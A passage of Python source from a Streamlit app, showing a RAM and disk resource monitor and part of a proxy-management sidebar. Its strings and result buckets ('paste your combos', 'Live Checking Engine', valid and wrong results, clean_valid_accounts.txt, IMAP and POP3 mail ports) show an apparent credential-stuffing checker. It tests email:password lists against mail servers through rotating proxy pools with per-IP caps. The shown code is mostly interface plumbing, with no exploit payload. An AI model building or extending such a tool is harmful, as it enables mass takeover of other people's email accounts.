    _map = str_lit.session_state.get("_res_uids") or {}
    _own = set(_res_own_files())
    _out = []
    for _uid, _p in _map.items():
        try:
            if _p in _own and str_lit.session_state.get("reschk_" + _uid):
                _out.append(_p)
        except Exception:
            continue
    return _out


def _res_forget_ticks(paths):
    """Drop the tick keys AND the uid-map entries for `paths`.

    v13.63b: this ASSIGNED False, because popping a live widget key was thought
    unreliable. v13.70: it is not unreliable HERE - every caller is an on_click
    callback, and a callback runs BEFORE the script body, so the checkbox it
    names does not exist yet at pop time and is re-created with its default on
    the next render. Assigning False left a dead reschk_* key and a dead map
    entry behind for the life of the session, so a few hundred deleted files
    meant a few hundred keys nothing would ever clean up.
    """
    _map = str_lit.session_state.get("_res_uids")
    for _p in paths:
        _uid = _res_uid(_p)
        try:
            str_lit.session_state.pop("reschk_" + _uid, None)
        except Exception:
            pass
        if isinstance(_map, dict):
            try:
                _map.pop(_uid, None)
            except Exception:
                pass


# --------------------------------------------------------------------------
# stored history
# --------------------------------------------------------------------------
def _mem_read():
    """Stored samples for THIS user, oldest first. Bad lines are skipped."""
    _out = []
    try:
        if os.path.exists(_MEM_FILE):
            with open(_MEM_FILE, encoding="utf-8", errors="ignore") as _fh:
                for _line in _fh:
                    _line = _line.strip()
                    if not _line:
                        continue
                    try:
                        _rec = json.loads(_line)
                    except Exception:
                        continue
                    if isinstance(_rec, dict) and isinstance(_rec.get("t"), (int, float)):
                        _out.append(_rec)
    except Exception:
        pass
    return _out


def _mem_write(rows):
    try:
        rows = list(rows)[-_MEM_MAX_LINES:]
        _tmp = _MEM_FILE + ".tmp"
        with open(_tmp, "w", encoding="utf-8") as _fh:
            for _rec in rows:
                _fh.write(json.dumps(_rec, separators=(",", ":")) + "\n")
        os.replace(_tmp, _MEM_FILE)
    except Exception as e:
        warnings.warn(f"could not write memory history: {e}")


def _mem_sample(force=False):
    """Append one sample. Throttled, so a fast rerun loop cannot flood the file.

    Read and append are under file_write_lock, so two tabs of the SAME user
    sampling at the same instant cannot lose one another's line. It is an RLock,
    so re-entering from a callback that already holds it is safe.
    """
    _now = time.time()
    _last = float(str_lit.session_state.get("_mem_last") or 0.0)
    if not force and (_now - _last) < _MEM_SAMPLE_SECONDS:
        return False
    str_lit.session_state["_mem_last"] = _now
    _snap = _res_snapshot()
    _rec = {"t": round(_now, 1),
            "rss": int(_snap.get("rss") or 0),
            "used": int(_snap.get("used") or 0),
            "lim": int(_snap.get("lim") or 0),
            "sess": int(_snap.get("sess") or 0),
            "own": int(_snap.get("own_b") or 0),
            "dfree": int(_snap.get("d_free") or 0)}
    try:
        with file_write_lock:
            _rows = _mem_read()
            _rows.append(_rec)
            _mem_write(_rows)
    except Exception:
        pass
    return True


def _mem_stats(rows):
    def _mx(key):
        _vals = [int(r.get(key) or 0) for r in rows]
        return max(_vals) if _vals else 0

    def _av(key):
        _vals = [int(r.get(key) or 0) for r in rows]
        return int(sum(_vals) / len(_vals)) if _vals else 0

    return {"n": len(rows), "peak_sess": _mx("sess"), "avg_sess": _av("sess"),
            "peak_rss": _mx("rss"),
            "first": rows[0].get("t") if rows else 0,
            "last": rows[-1].get("t") if rows else 0}


def _on_mem_sample_now():
    _mem_sample(force=True)
    str_lit.session_state["_res_flash"] = ("success", "Sample recorded.")


def _on_clear_mem_history():
    _mem_write([])
    str_lit.session_state["_mem_last"] = 0.0
    str_lit.session_state["_res_flash"] = ("success", "My memory history is cleared.")


# --------------------------------------------------------------------------
# file browser actions
# --------------------------------------------------------------------------
def _on_clear_ticks():
    _map = str_lit.session_state.get("_res_uids") or {}
    for _uid in list(_map.keys()):
        try:
            str_lit.session_state.pop("reschk_" + _uid, None)
        except Exception:
            pass
    str_lit.session_state["_res_flash"] = ("success", "Ticks cleared.")


def _on_delete_selected():
    _paths = _res_selected_paths()
    if not _paths:
        str_lit.session_state["_res_flash"] = ("warning", "Nothing ticked.")
        return
    _n = _res_delete(_paths)
    _res_forget_ticks(_paths)
    _prev = str_lit.session_state.get("_res_prev")
    if isinstance(_prev, dict):
        for _p in _paths:
            _prev.pop(_p, None)
    str_lit.session_state.pop("_res_snap", None)
    _msg = f"Deleted {_n} file(s)."
    if any(_res_is_result_file(_p) for _p in _paths):
        _msg += (" Session buckets still hold their rows - use 'Delete my RESULT "
                 "files' to empty those too.")
    str_lit.session_state["_res_flash"] = ("success", _msg)


def _on_download_selected():
    _paths = _res_selected_paths()
    if not _paths:
        str_lit.session_state["_res_flash"] = ("warning", "Nothing ticked.")
        return
    _stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        if len(_paths) == 1:
            _p = _paths[0]
            with open(_p, "rb") as _fh:
                _data = _fh.read()
            _name = os.path.basename(_p)
            _mime = ("text/plain"
                     if _name.endswith((".txt", ".json", ".jsonl", ".py", ".csv"))
                     else "application/octet-stream")
        else:
            import io as _io
            _buf = _io.BytesIO()
            _seen = {}
            with zipfile.ZipFile(_buf, "w", zipfile.ZIP_DEFLATED) as _z:
                for _p in _paths:
                    _bn = os.path.basename(_p)
                    if _bn in _seen:
                        _seen[_bn] += 1
                        _stem, _dot, _ext = _bn.rpartition(".")
                        _bn = (f"{_stem or _bn}_{_seen[_bn]}.{_ext}" if _dot
                               else f"{_bn}_{_seen[_bn]}")
                    else:
                        _seen[_bn] = 1
                    try:
                        _z.write(_p, _bn)
                    except Exception:
                        continue
            _data = _buf.getvalue()
            _name = f"my_files_{len(_paths)}_{_stamp}.zip"
            _mime = "application/zip"
    except Exception as _e:
        str_lit.session_state["_res_flash"] = ("warning", f"Could not stage: {_e}")
        return
    str_lit.session_state["_res_dl"] = (_data, _name, _mime)
    str_lit.session_state["_res_flash"] = (
        "success", f"Staged {len(_paths)} file(s) - press the Download button below.")


def _on_clear_staged():
    str_lit.session_state.pop("_res_dl", None)


# --------------------------------------------------------------------------
# bulk release actions
# --------------------------------------------------------------------------
def _on_free_ram():
    """Trim MY session payload. Nothing on disk is touched, no result is lost."""
    _ss = str_lit.session_state
    for _k, _keep in (("report_entries", 300), ("log_lines", 200),
                      ("startup_entries", 200), ("_dbg_log", 100)):
        try:
            _v = _ss.get(_k) or []
            if len(_v) > _keep:
                _ss[_k] = list(_v)[-_keep:]
        except Exception:
            pass
    for _k in ("_bb_prefilter_cache", "bb_reader_msgs", "bb_reader_note",
               "_ex_zip", "_fmt_bad", "_fmt_truncated", "_res_snap",
               "_res_dl", "_res_prev"):
        try:
            _ss.pop(_k, None)
        except Exception:
            pass
    # The diagnostic bundle and the self-test text are big strings cached in
    # process STATE; drop them only when they are MINE.
    try:
        if (STATE.get("diag_cache") or {}).get("user") == _cache_owner():
            STATE["diag_cache"] = {"ts": 0.0, "text": "", "user": ""}
        if (STATE.get("selftest") or {}).get("user") == _cache_owner():
            STATE.pop("selftest", None)
    except Exception:
        pass
    try:
        import gc
        gc.collect()
    except Exception:
        pass
    _mem_sample(force=True)
    str_lit.session_state["_res_flash"] = (
        "success", "Trimmed my session payload and collected garbage. No file deleted.")


def _on_clear_cache_files():
    """Delete MY rebuildable files. Keeps results, settings, theme, presets, pool."""
    _pfx = os.path.basename(user_file("")) or ""
    _victims = []
    for _p in _res_own_files():
        _base = os.path.basename(_p)
        if _pfx and _base.startswith(_pfx + "_"):
            _base = _base[len(_pfx) + 1:]
        if _base in _RES_KEEP_SUFFIX:
            continue
        if _res_is_result_file(_p):
            continue
        _victims.append(_p)
    _n = _res_delete(_victims)
    _res_forget_ticks(_victims)
    str_lit.session_state.pop("_res_snap", None)
    str_lit.session_state["_res_flash"] = ("success", f"Removed {_n} cache file(s).")


def _on_clear_result_files():
    """Delete MY result files AND the buckets holding them. Keeps the paste box.

    v13.70: the _pfx assignment here was dead - it was computed and then never
    read, because the filter below matches on the DIRECTORY name and on the
    clean-valid suffix, both of which already carry the prefix.
    """
    _victims = []
    for _p in _res_own_files():
        _base = os.path.basename(_p)
        if _res_is_result_file(_p) or _base.endswith("_clean_valid_accounts.txt"):
            _victims.append(_p)
    _n = _res_delete(_victims)
    _res_forget_ticks(_victims)
    _ss = str_lit.session_state
    for _k in ("valid_results", "wrong_results", "need_app_results",
               "login_drop_results", "conn_results", "proxy_results",
               "retry_results", "rbl_results", "smtp_results", "dns_results",
               "skip_results", "unknown_results", "report_entries", "log_lines",
               "pre_dns_failed", "pre_smtp_failed"):
        try:
            _ss[_k] = []
        except Exception:
            pass
    for _k, _v in (("checked_emails_set", set()), ("zip_bytes", None),
                   ("zip_name", ""), ("engine_has_run", False),
                   ("clean_valid_count", 0), ("run_valid_count", 0),
                   ("_bb_prefilter_cache", None), ("_res_snap", None),
                   ("_res_prev", None)):
        try:
            _ss[_k] = _v
        except Exception:
            pass
    try:
        invalidate_valid_caches()
    except Exception:
        pass
    _mem_sample(force=True)
    str_lit.session_state["_res_flash"] = (
        "success", f"Removed {_n} result file(s) and emptied my buckets.")


section_title("🧮", "Resources (RAM / Disk)",
              "live readings, my files, my stored history, and the buttons that give it back")

_res_flash = str_lit.session_state.pop("_res_flash", None)
if _res_flash:
    getattr(str_lit, _res_flash[0], str_lit.info)(_res_flash[1])

# Sampling happens OUTSIDE the gate, so history keeps filling while the panel is
# shut. It is throttled, so this is one cheap call per minute.
_mem_sample()

# v13.63b: A CHECKBOX, not an expander. An expander keeps no state, so every
# click collapsed it - which is what made the buttons look dead. The checkbox
# persists, so the panel stays open while you work in it.
_res_open = str_lit.checkbox("🧮 Open the resource monitor", key="res_open")

if _res_open:
    _rs = _res_snapshot()

    str_lit.caption("The container figures are shared by EVERY session on this "
                    "deployment - RAM belongs to the process, not to a person. Only "
                    "the two 'mine' figures are yours, and only those can be given "
                    "back from here.")

    _lim = _rs.get("lim") or 0
    _used = _rs.get("used") or 0
    _bar = _used or (_rs.get("rss") or 0)
    _rp1, _rp2, _rp3, _rp4 = str_lit.columns(4)
    _rp1.metric("Container RAM used", _res_fmt(_rs.get("used")),
                help="cgroup memory.current. Page cache included, every session "
                     "counted, and the exact figure the kernel's OOM killer acts on.")
    _rp2.metric("Container RAM limit", _res_fmt(_lim) if _lim else "no limit file")
    _rp3.metric("This process RSS", _res_fmt(_rs.get("rss")),
                help="VmRSS from /proc/self/status - what the interpreter is really "
                     "holding. The gap up to 'Container RAM used' is reclaimable "
                     "cache, so it is headroom, not a leak.")
    _rp4.metric("This process peak", _res_fmt(_rs.get("peak")),
                help="VmHWM - the high-water mark since the process started. A peak "
                     "far above the current RSS is a spike, not a standing cost.")
    if _lim and _bar:
        _pct = min(1.0, float(_bar) / float(_lim))
        str_lit.progress(
            _pct, text=f"{_pct * 100:.0f}% of the {_res_fmt(_lim)} container limit"
                       + ("" if _used else "  (limit file unreadable - the bar is on RSS)"))
    if _lim and _used:
        str_lit.caption(
            f"Headroom to the limit: **{_res_fmt(max(0, _lim - _used))}**. Streamlit "
            f"Cloud kills the container when that reaches zero, and the kill lands "
            f"before any handler in this file can run - which is why this panel "
            f"exists and why the run keeps its payload small.")

    _rm1, _rm2, _rm3, _rm4 = str_lit.columns(4)
    _rm1.metric("My session payload", _res_fmt(_rs.get("sess")),
                help="My result lists, report entries, logs, paste buffer and preview "
                     "cache. This is the part that drives the OOM kills, and the only "
                     "part 'Free my RAM' touches.")
    _rm2.metric("My files on disk", _res_fmt(_rs.get("own_b")),
                help=f"{_rs.get('own_n', 0)} file(s) carrying my own prefix.")
    _rm3.metric("Filesystem free", _res_fmt(_rs.get("d_free")),
                help="Free space where the app writes - the number an out-of-disk "
                     "error turns on.")
    _rm4.metric("Filesystem total (shared host disk)",
                _res_fmt(_rs.get("d_total")),
                help="The host overlay, not a per-app quota. Read the free figure "
                     "above it, not this one.")
    _dtot = _rs.get("d_total") or 0
    _dfree = _rs.get("d_free") or 0
    if _dtot and _dfree:
        _fpct = min(1.0, float(max(0, _dtot - _dfree)) / float(_dtot))
        str_lit.progress(_fpct, text=f"Filesystem {_fpct * 100:.0f}% used overall "
                                     f"({_res_fmt(_dfree)} free) - container-wide, "
                                     f"shared with every session")

    _res_ok = str_lit.toggle("Confirm the delete buttons", key="res_confirm",
                             help="Every delete stays disabled until this is on, so a "
                                  "stray tap on a phone cannot wipe a result set.")
    if not _res_ok:
        str_lit.caption("⬆ Turn that on first - every delete button is disabled while "
                        "it is off.")

    _rb1, _rb2, _rb3 = str_lit.columns(3)
    with _rb1:
        str_lit.button("♻️ Free my RAM", width="stretch", on_click=_on_free_ram,
                       help="Trims my log and report tails, drops my caches, my built "
                            "ZIP and any staged download, collects garbage. Nothing on "
                            "disk is deleted and no result is lost.")
    with _rb2:
        str_lit.button("🧹 Delete my cache files", width="stretch",
                       on_click=_on_clear_cache_files, disabled=not _res_ok,
                       help="Domain cache, proxy metadata, key map, proxies_all "
                            "backup and my data/ scratch directory. Keeps results, "
                            "settings, theme, presets, proxies.txt, my history, my "
                            "reader's remembered account, the disposable blocklist and "
                            "my notifications.")
    with _rb3:
        str_lit.button("🗑 Delete my RESULT files", width="stretch",
                       on_click=_on_clear_result_files, disabled=not _res_ok,
                       help="mail_results/* and clean_valid_accounts.txt, plus the "
                            "buckets in this session. Keeps settings, theme, presets, "
                            "the paste box and my history. 'Skip previously valid' "
                            "starts from empty after.")

    _brk = []
    for _k in _RES_SESSION_KEYS:
        try:
            _n = len(str_lit.session_state.get(_k) or ())
        except Exception:
            _n = 0
        if _n:
            _brk.append((_n, _k))
    if _brk:
        _brk.sort(reverse=True)
        str_lit.caption("My payload by entry count - this is what 'Free my RAM' trims: "
                        + ", ".join(f"{_k}={_n}" for _n, _k in _brk[:6]))
    else:
        str_lit.caption("My session payload is empty.")

    # ----------------------------------------------------------------------
    # MY FILES - view, tick, download, delete
    # ----------------------------------------------------------------------
    str_lit.markdown("---")
    str_lit.markdown("#### 🗂 My files (view, download, delete)")

    _files = sorted(_res_own_files())
    _uids = {}
    for _p in _files:
        _uids[_res_uid(_p)] = _p
    str_lit.session_state["_res_uids"] = _uids

    if not _files:
        str_lit.caption("No files of mine on disk yet.")
    else:
        str_lit.caption(f"{len(_files)} file(s), all carrying my own prefix. Tick a row "
                        f"to select it, open a row to read it. Nothing here can reach "
                        f"another user's file.")
        _fb1, _fb2, _fb3 = str_lit.columns(3)
        with _fb1:
            str_lit.button("⬇️ Download ticked", width="stretch",
                           on_click=_on_download_selected,
                           help="One file downloads as itself; two or more download as "
                                "a ZIP.")
        with _fb2:
            str_lit.button("🗑 Delete ticked", width="stretch",
                           on_click=_on_delete_selected, disabled=not _res_ok,
                           help="Disabled until 'Confirm the delete buttons' is on.")
        with _fb3:
            str_lit.button("☑️ Clear ticks", width="stretch", on_click=_on_clear_ticks)

        _staged = str_lit.session_state.get("_res_dl")
        if _staged:
            str_lit.download_button(f"⬇️ Download {_staged[1]}", data=_staged[0],
                                    file_name=_staged[1], mime=_staged[2],
                                    width="stretch", key="res_dl_btn")
            str_lit.button("✖️ Discard staged download", key="res_dl_clear",
                           on_click=_on_clear_staged)

        for _p in _files:
            _uid = _res_uid(_p)
            try:
                _sz = os.path.getsize(_p)
            except Exception:
                _sz = 0
            _rel = os.path.relpath(_p, os.getcwd())
            _cchk, _cbody = str_lit.columns([0.10, 0.90])
            with _cchk:
                str_lit.checkbox("sel", key="reschk_" + _uid,
                                 label_visibility="collapsed")
            with _cbody:
                with str_lit.expander(f"{_rel}  ·  {_res_fmt(_sz)}", expanded=False):
                    _txt, _note = _res_preview(_p)
                    str_lit.caption(_note)
                    if _txt:
                        with str_lit.container(height=260):
                            str_lit.code(_txt, language="text")
                    else:
                        str_lit.caption("no preview available - download it instead")

    str_lit.caption("Readings refresh at most every 3 seconds. Off Linux (no /proc, no "
                    "cgroup) the memory figures read ? and everything else still works.")

    # ----------------------------------------------------------------------
    # MY STORED HISTORY
    # ----------------------------------------------------------------------
    str_lit.markdown("---")
    str_lit.markdown("#### 📈 My memory history (stored on my own file)")
    str_lit.caption("One sample a minute at most, only while this tab is being used - "
                    "Streamlit has no background scheduler here. Capped at "
                    f"{_MEM_MAX_LINES} samples; the oldest is dropped first.")

    _mrows = _mem_read()
    if _mrows:
        _mst = _mem_stats(_mrows)
        _span = max(0.0, float(_mst["last"] or 0) - float(_mst["first"] or 0))
        str_lit.caption(f"{_mst['n']} sample(s) stored over {_span / 3600:.1f}h.")

        _mc1, _mc2, _mc3 = str_lit.columns(3)
        _mc1.metric("Peak my payload", _res_fmt(_mst["peak_sess"]))
        _mc2.metric("Average my payload", _res_fmt(_mst["avg_sess"]))
        _mc3.metric("Peak process RSS", _res_fmt(_mst["peak_rss"]))

        _tail = _mrows[-_MEM_CHART_POINTS:]
        try:
            _mdf = pd.DataFrame(
                {
                    "my payload (MB)": [round(int(_r.get("sess") or 0) / 1048576, 2)
                                        for _r in _tail],
                    "container RAM (MB)": [round(int(_r.get("used")
                                                    or _r.get("rss") or 0) / 1048576, 2)
                                           for _r in _tail],
                },
                index=pd.to_datetime([_r.get("t") or 0 for _r in _tail], unit="s"),
            )
            str_lit.line_chart(_mdf, height=220)
        except Exception as _chart_err:
            str_lit.caption(f"chart unavailable: {_chart_err}")

        str_lit.code("\n".join(
            f"{datetime.fromtimestamp(float(_r.get('t') or 0)).strftime('%m-%d %H:%M:%S')}  "
            f"mine={_res_fmt(_r.get('sess') or 0):>9}  "
            f"ram={_res_fmt(_r.get('used') or 0):>9}  "
            f"files={_res_fmt(_r.get('own') or 0):>9}  "
            f"free={_res_fmt(_r.get('dfree') or 0):>9}"
            for _r in reversed(_mrows[-40:])), language="text")
    else:
        str_lit.caption("No samples stored yet - one is taken automatically within a "
                        "minute of use, or press the button.")

    _mb1, _mb2 = str_lit.columns(2)
    with _mb1:
        str_lit.button("📌 Take a sample now", width="stretch",
                       on_click=_on_mem_sample_now,
                       help="Records one reading immediately instead of waiting for "
                            "the next interval.")
    with _mb2:
        str_lit.button("🧽 Clear my memory history", width="stretch",
                       on_click=_on_clear_mem_history,
                       help="Deletes only my history file. The live readings above "
                            "keep working, and nothing else is touched.")
# @@END 079 STARTUP_PANEL_UI

# @@BLOCK 080 PROXY_MGMT_UI deps=014,016,024,043,052,058,068,070,073,074,077
with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")

    # FIX FLASH-1 (v13.49): every branch below ended in success()/warning() and
    # then str_lit.rerun(), and a rerun destroys the delta the message was drawn
    # into - so "N node(s) validated", "Pool re-probed" and "Restored N line(s)"
    # were never actually visible. The message is carried across the rerun and
    # rendered here instead.
    _flash = str_lit.session_state.pop("_proxy_flash", None)
    if _flash:
        _lvl, _msg = _flash
        getattr(str_lit, _lvl, str_lit.info)(_msg)

    if (not all_proxies) and WEBSHARE_KEYS and not _US.get("bootstrap_done"):
        with str_lit.spinner("First run - fetching and validating your proxy pool..."):
            try:
                _boot_n, _boot_total = fetch_and_test_all_proxies(silent=True)
            except Exception as _be:
                _boot_n = 0
                log_startup(f"WARNING: auto-bootstrap failed: {_be}")
        # v13.65: THE FLAG WAS LATCHED BEFORE THE FETCH. One failed first fetch
        # disabled the auto-bootstrap for the life of the process. It is set only
        # on a real result now.
        if _boot_n:
            _US["bootstrap_done"] = True
        else:
            log_startup("Auto-bootstrap produced no node - it will retry on the "
                        "next load.")
        all_proxies = load_proxies()
        filtered_pool = get_filtered_active_proxies(quiet=True)

    if (_US.get("last_probe_ts", 0.0) == 0.0 and all_proxies
            and not _US.get("probe_in_flight")
            and not _US.get("first_probe_kicked")):
        _US["first_probe_kicked"] = True
        log_probe_event("first-load probe kicked to a background thread (UI not blocked)")
        _pwho = _gate_scope()

        def _first_probe(_scope=_pwho):
            _pin_gate_scope(_scope)
            refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)

        threading.Thread(target=_first_probe, daemon=True,
                         name="first-probe-" + _pwho).start()
        str_lit.caption("⏳ First probe running in the background - the page is already usable.")

    # FIX KEY-1 (v13.58): THE KEY LABEL. A node is only actionable if you can name
    # the API key behind it. The map is written by block 077; _US first (cheap),
    # the per-user JSON as the restart-safe fallback.
    _keymap = _US.get("proxy_key_map")
    if not isinstance(_keymap, dict) or not _keymap:
        _keymap = load_json(live_cfg().get("PROXY_KEYMAP_FILE", "proxy_key_map.json"), {}) or {}

    def _key_of(proxy_line):
        return _keymap.get(proxy_line, -2)

    def _key_label(idx):
        if idx == -1:
            return "oxylabs"
        if idx is None or idx < 0:
            return "? (pre-restart)"
        try:
            return f"#{idx + 1} {WEBSHARE_KEYS[idx][:6]}…"
        except Exception:
            return f"#{idx + 1}"

    _q_now = quarantine_size()
    _alive_now = len(alive_pool)
    _last_ts = _US.get("last_probe_ts", 0.0)
    _age = int(time.time() - _last_ts) if _last_ts else -1
    _age_txt = f"{_age}s ago" if _age >= 0 else "never"

    # FIX LAG-P: parse_proxy() ran TWICE per line here for the IP set and twice
    # again via _subuser_of() for the user set - four parses per line, every
    # rerun. One pass fills both.
    _ips, _subs = set(), set()
    for _p in all_proxies:
        _pi = parse_proxy(_p)
        if _pi:
            _ips.add(_pi["host"])
            _su = (_pi.get("user") or "").strip().lower()
            if _su:
                _subs.add(_su)

    # FIX UI-1 (the ledger lie): filtered_pool is re-created EMPTY at module level
    # on EVERY rerun (block 058) and nothing fills it before this point, so
    # `not filtered_pool` was true on every single load - the error below fired
    # unconditionally and, because st.error CLOSES the pending press, Reset Theme,
    # Reset Display Fit, every help_btn and Show raw proxies.txt were all recorded
    # as FAILED with a proxy message. The pool was never broken; the banner was.
    # FIX UI-3: the compute now sits ABOVE the info line, so "Filtered:" is never
    # the stale module-level 0 either.
    if all_proxies and not filtered_pool:
        filtered_pool = get_filtered_active_proxies(quiet=True)

    # FIX UI-2: a page-level banner also steals presses when it is healthy - the
    # READY success below did exactly the same thing. Every banner now only uses a
    # real message widget when nothing has reported yet, and degrades to a caption
    # otherwise, so an unrelated press closes honestly.
    _pend = str_lit.session_state.get("_audit_pending") or {}
    _steal = bool(_pend) and not _pend.get("outcome")

    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
                 f"**{len(_subs)}** sub-users / **{len(WEBSHARE_KEYS)}** keys | "
                 f"Filtered: **{len(filtered_pool)}** | Alive: **{_alive_now}**")

    if all_proxies and not filtered_pool:
        _etxt = ("⚠ **Every proxy was filtered out** by Min Proxy Score / pool mode / "
                 "circuit breaker. Lower 'Min Proxy Score' or press ♻️ Lift 407 "
                 "Quarantine. The raw list is NOT used as a silent fallback.")
        (str_lit.caption if _steal else str_lit.error)(_etxt)

    _p_ok, _p_auth, _p_plan, _p_to, _p_dead = probe_summary()

    # FIX ISO-4: the bool used to be cleared by whichever run ended first, so one
    # user's exit hid another user's live run and this banner claimed READY
    # mid-run.
    # FIX ISO-6: the count is PER USER now. _any_run_active() answers for the whole
    # process, so a second user's page said "a run is live" - and stayed silent -
    # while only the first user was checking anything, and the reverse. The owner's
    # own count is the only correct answer here.
    # FIX UI-4: "N validated node(s) armed" was a lie when NONE passed the probe,
    # and len(alive_pool) is not the same number as the nodes the engine may use -
    # report the probe-pass count so the banner cannot overstate the pool.
    # FIX PLAN-1: 402 used to be reported as a 407 and read as a dead pool. It is
    # the provider refusing service on nodes that are alive and authenticated.
    if _alive_now and int(_US.get("runs_active", 0)) <= 0:
        if _p_ok:
            _rtxt = (f"✅ READY - **{_p_ok}** validated node(s) armed. "
                     f"Paste your combos and press 🔥 Start Live Checking Engine. "
                     f"Nothing else to set.")
            _rfunc = str_lit.caption if _steal else str_lit.success
        elif _p_plan:
            _rtxt = (f"⚠ **{_p_plan}** node(s) answered **402 Payment Required** - the "
                     f"provider's bandwidth/plan is spent on those sub-users. They are "
                     f"alive and authenticate; they will work again when the plan resets. "
                     f"**{_alive_now}** node(s) are armed - press Start, or set Proxy Mode "
                     f"Engine = off (DIRECT).")
            _rfunc = str_lit.caption if _steal else str_lit.warning
        else:
            _rtxt = (f"⚠ **{_alive_now}** node(s) armed but **0 passed the probe** - "
                     f"they will mostly 407. Set **Proxy Mode Engine = off** (DIRECT), "
                     f"or press ♻️ Lift 407 Quarantine.")
            _rfunc = str_lit.caption if _steal else str_lit.warning
        _rfunc(_rtxt)
    elif not all_proxies and not WEBSHARE_KEYS:
        str_lit.info("No proxies configured - press 📥 Fetch & Test All Proxies, or run "
                     "fully DIRECT.")

    str_lit.caption(
        f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
        f"pass **{_p_ok}** | 407 **{_p_auth}** | 402 **{_p_plan}** | "
        f"timeout/reset **{_p_to}** | dead **{_p_dead}**  ·  last probe {_age_txt}  ·  "
        f"runs {_US.get('probe_runs', 0)}"
        + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
    )
    str_lit.caption(f"Probe targets in use: "
                    f"{', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
    str_lit.caption(f"Protocols dialled: **{' + '.join(active_protocols())}**")

    _ms = STATE.get("mail_spot") or {}
    # v13.54: STATE["mail_spot"] is process state. Only show it when it belongs to
    # THIS session, or one user's mail-port failure banner renders in everyone
    # else's sidebar as though it were theirs.
    if _ms.get("user") and _ms.get("user") != _gate_scope():
        _ms = {}
    if _ms.get("n"):
        _ms_age = int(time.time() - _ms.get("ts", 0))
        # FIX PLAN-1: the 402 count has its own column. It used to be folded into
        # `other`, so a wholly spent plan produced pass=0 / 407=0 / other=3 and the
        # banner below - which only ever looked at `auth` - said nothing at all.
        _ms_txt = (f"Mail-destination spot check ({_ms['host']}:{_ms['port']}): "
                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | "
                   f"402 **{_ms.get('plan', 0)}** | other **{_ms['other']}** "
                   f"/ {_ms['n']} node(s), {_ms_age}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            if _p_ok:
                _mtail = ("every sampled node authenticated on 443 and was then refused "
                          "ON THE MAIL PORT, so the credential and the node are both "
                          "fine - the provider is refusing this destination. Set "
                          "**Proxy Mode Engine = off** (DIRECT) for the run.")
            else:
                _mtail = ("nodes failed the 443 control too, so the provider is "
                          "rejecting the credential or the plan itself, not the mail "
                          "port. Set **Proxy Mode Engine = off** (DIRECT), or check the "
                          "sub-user passwords and the plan's concurrency cap.")
            # FIX UI-5: this was the THIRD unconditional st.error and the one still
            # stamping FAILED onto Reset Display Fit.
            _mfull = "🚨 " + _ms_txt + " - " + _mtail
            (str_lit.caption if _steal else str_lit.error)(_mfull)
        elif _ms.get("plan") and not _ms.get("ok"):
            # v13.64: a plan-refused mail destination is neither a dead node nor a
            # credential problem, and it used to fall into the plain caption with
            # nothing said about it.
            _mfull = ("⚠ " + _ms_txt + " - every sampled node answered **402 Payment "
                      "Required** on the MAIL destination. The nodes authenticate and "
                      "are alive; the plan's bandwidth is spent, so those attempts can "
                      "never reach a mailbox. Set **Proxy Mode Engine = off** (DIRECT) "
                      "until it resets, or expect every account to fall through to "
                      "DIRECT on its own.")
            (str_lit.caption if _steal else str_lit.warning)(_mfull)
        else:
            str_lit.caption(_ms_txt)

    _tr = _probe_target_reachability()
    _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
    str_lit.caption(f"App-host direct reachability: {_tr_txt}")
    str_lit.caption(
        f"Concurrency: host cap **{CFG.get('HOST_CONCURRENCY')}** · per-IP cap "
        f"**{CFG.get('PROXY_IP_CONCURRENCY')}** · per-SUBUSER cap "
        f"**{CFG.get('PROXY_SUBUSER_CONCURRENCY')}** · proxy cap "
        f"**{CFG.get('PROXY_CONCURRENCY')}**"
        f" · rotation **{'RANDOM' if CFG.get('RANDOM_ROTATION') else 'round-robin'}**"
    )
    _rb = request_budget()
    str_lit.caption(
        f"Request budget: ~**{_rb['per_account']}** proxy request(s) per account worst case · "
        f"**{_rb['idle_per_min']:.0f}/min** background probing while idle · "
        f"**{_rb['cycle']}** per full pool cycle"
        + ("" if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT)
           else "  ·  idle probing **OFF** (probes only on load / Start / Re-probe)")
    )
    str_lit.caption(
        f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
        f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · "
        f"park **{PROXY_407_COOLDOWN:.0f}s** · 402 park "
        f"**{PROXY_PLAN_PARK:.0f}s** · "
        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · "
        f"legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
    )
    str_lit.caption(
        f"Verdict guard: WRONG is confirmed across hosts = "
        f"**{CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}** · "
        f"self-signed = **{CFG.get('ALLOW_SELF_SIGNED')}** "
        f"(strict={CFG.get('TLS_STRICT')})"
    )

    # FIX UI-7 (v13.57): these two were unconditional st.warning calls, so they
    # closed the pending press on every load and stamped FAILED onto unrelated
    # buttons - the exact fault UI-2 fixed for the banner above. They route
    # through _steal now, and the zero-alive text stops blaming the pool when the
    # real reason is a 402 that the pool cannot do anything about.
    if _q_now:
        (str_lit.caption if _steal else str_lit.warning)(
            f"🩹 Quarantined for 407: **{_q_now}** node(s)")
    if not all_proxies:
        str_lit.caption("No proxies configured - the engine will run fully DIRECT until "
                        "you add some.")
    elif _alive_now == 0:
        if _p_plan:
            _ztxt = (f"⚠ **{_p_plan}** node(s) answered **402** - the pool is alive and "
                     f"authenticates; the provider's plan is refusing service. They stay "
                     f"in the pool and every account runs DIRECT until it resets.")
        else:
            _ztxt = ("⚠ No node passed the tunnel probe. Press 📥 Fetch & Test All "
                     "Proxies again - every account will run DIRECT until one does.")
        (str_lit.caption if _steal else str_lit.warning)(_ztxt)
    else:
        str_lit.caption("A refusal is reported THREE ways. '407 auth (node)' = the node "
